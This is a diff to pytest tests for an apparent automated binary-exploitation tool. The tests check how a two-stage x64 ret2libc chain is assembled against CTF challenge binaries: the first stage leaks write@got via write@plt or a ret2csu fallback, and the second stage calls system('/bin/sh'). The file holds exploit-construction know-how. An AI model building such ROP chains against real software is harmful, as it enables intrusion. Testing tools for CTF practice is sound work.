@@ -152,17 +152,13 @@ class TestRet2LibcWriteX64:
         assert Ret2LibcWriteX64().stage_count() == 2
 
     def test_stage1_payload_length(self, challenge_dir):
-        """Stage 1: padding + 48 (6 p64: pop_rdi, 1, pop_rsi, write_got, write_plt, main).
-
-        Note: x64 ``write`` takes 3 args (fd, buf, count) but v3.1
-        only sets 2 (fd via pop_rdi, buf via pop_rsi) — the
-        count goes via rdx which is whatever was left in the
-        register.  P6.4 preserves the v3.1 shape.
-        """
+        """On ``level3_x64``, stage 1 falls back to a parsed ret2csu chain."""
         from autopwn.context import RopGadgetsX64
-        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64
+        from autopwn.primitives.ret2libc_write import (
+            Ret2LibcWriteX64,
+            _find_x64_ret2csu_plan,
+        )
 
-        # level3_x64 is the only Challenge/ binary with write@plt
         ctx = ctx_for("level3_x64", bit=64)
         ctx.padding = 24
         ctx.gadgets_x64 = RopGadgetsX64(
@@ -170,12 +166,17 @@ class TestRet2LibcWriteX64:
             extra_rdi=0, extra_rsi=0,
         )
         payload = Ret2LibcWriteX64().build_payload(ctx)
-        assert len(payload) == 24 + 48
+        plan = _find_x64_ret2csu_plan(str(ctx.binary.path))
+        assert plan is not None
+        qword_count = 1 + len(plan.pop_order) + 1 + plan.stack_skip_qwords + len(plan.pop_order) + 1
+        assert len(payload) == 24 + qword_count * 8
 
-    def test_stage1_uses_pop_rdi_and_pop_rsi_gadgets(self, challenge_dir):
-        """Stage 1's pop_rdi and pop_rsi gadgets appear in the payload."""
+    def test_stage1_uses_pop_rdi_pop_rsi_and_pop_rdx_when_direct_gadget_exists(
+        self, challenge_dir, monkeypatch,
+    ):
+        """Direct x64 stage 1 uses explicit rdi/rsi/rdx control when available."""
         from autopwn.context import RopGadgetsX64
-        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64
+        from autopwn.primitives import ret2libc_write as write_mod
 
         ctx = ctx_for("level3_x64", bit=64)
         ctx.padding = 4
@@ -183,16 +184,25 @@ class TestRet2LibcWriteX64:
             pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
             extra_rdi=0, extra_rsi=0,
         )
-        payload = Ret2LibcWriteX64().build_payload(ctx)
-        # Skip 4 padding; first 2 p64: pop_rdi, fd=1
-        pop_rdi, fd = struct.unpack("<2Q", payload[4:20])
+        monkeypatch.setattr(
+            write_mod,
+            "_find_x64_pop_rdx_gadget",
+            lambda _program: write_mod._X64PopGadget(addr=0xDDDD, extra_pop_count=0),
+        )
+        monkeypatch.setattr(write_mod, "_find_x64_ret2csu_plan", lambda _program: None)
+
+        payload = write_mod.Ret2LibcWriteX64().build_payload(ctx)
+        pop_rdi, fd, pop_rsi, buf, pop_rdx, count, write_plt, main = struct.unpack(
+            "<8Q", payload[4:]
+        )
         assert pop_rdi == 0xAAAA
         assert fd == 1
-        # Next 2 p64: pop_rsi, buf=write_got
-        pop_rsi, buf = struct.unpack("<2Q", payload[20:36])
         assert pop_rsi == 0xBBBB
-        # buf is the binary's write@got — non-zero
         assert buf != 0
+        assert pop_rdx == 0xDDDD
+        assert count == 8
+        assert write_plt != 0
+        assert main != 0
 
     def test_stage2_includes_ret_alignment_gadget(self, challenge_dir):
         """Stage 2 includes the ``ret`` alignment gadget (P6.2 fix)."""
@@ -222,19 +232,47 @@ class TestRet2LibcWriteX64:
         assert system == 0x200000 + libc.symbols["system"]
         assert sh == 0x200000 + next(libc.search(b"/bin/sh"))
 
-    def test_returns_empty_without_gadgets(self, challenge_dir):
-        """No gadgets → stage 1 + stage 2 both return ``b""``."""
+    def test_stage2_still_includes_ret_when_frame_context_says_zero(self, challenge_dir):
+        """2-stage x64 write keeps a conservative minimum of one ``ret``."""
+        from types import SimpleNamespace
+
+        from pwn import ELF
+
+        from autopwn.context import RopGadgetsX64
         from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64
+
+        ctx = ctx_for("level3_x64", bit=64)
+        ctx.padding = 8
+        ctx.gadgets_x64 = RopGadgetsX64(
+            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
+            extra_rdi=0, extra_rsi=0,
+        )
+        ctx.frame_context = SimpleNamespace(required_ret_count=0)
+        libc = ELF(LIBC_64, checksec=False)
+        ctx.libc.elf = libc
+
+        fake_leak = 0x200000 + libc.symbols["write"]
+        payload = Ret2LibcWriteX64().build_stage2_payload(ctx, fake_leak)
+        pop_rdi, sh, ret, system = struct.unpack("<4Q", payload[8:40])
+        assert pop_rdi == 0xAAAA
+        assert sh == 0x200000 + next(libc.search(b"/bin/sh"))
+        assert ret == 0xCCCC
+        assert system == 0x200000 + libc.symbols["system"]
+
+    def test_returns_empty_without_gadgets(self, challenge_dir, monkeypatch):
+        """No direct-rdx and no ret2csu path → stage 1 returns ``b""``."""
+        from autopwn.primitives import ret2libc_write as write_mod
 
         ctx = ctx_for("level3_x64", bit=64)
         ctx.padding = 24
         ctx.gadgets_x64 = None
-        assert Ret2LibcWriteX64().build_payload(ctx) == b""
+        monkeypatch.setattr(write_mod, "_find_x64_ret2csu_plan", lambda _program: None)
+        assert write_mod.Ret2LibcWriteX64().build_payload(ctx) == b""
 
     def test_returns_empty_with_zero_pop_rsi(self, challenge_dir):
-        """Missing pop_rsi gadget → stage 1 returns ``b""``."""
+        """Missing pop_rsi can still use ret2csu fallback on ``level3_x64``."""
         from autopwn.context import RopGadgetsX64
-        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64
+        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64, _find_x64_ret2csu_plan
 
         ctx = ctx_for("level3_x64", bit=64)
         ctx.padding = 24
@@ -243,7 +281,9 @@ class TestRet2LibcWriteX64:
             extra_rdi=0, extra_rsi=0,
         )
         payload = Ret2LibcWriteX64().build_payload(ctx)
-        assert payload == b""
+        plan = _find_x64_ret2csu_plan(str(ctx.binary.path))
+        assert plan is not None
+        assert payload.startswith(b"\x90" * 24 + struct.pack("<Q", plan.pop_gadget))
 
     def test_returns_empty_without_libc_for_stage2(self, challenge_dir):
         """No libc → stage 2 returns ``b""``."""
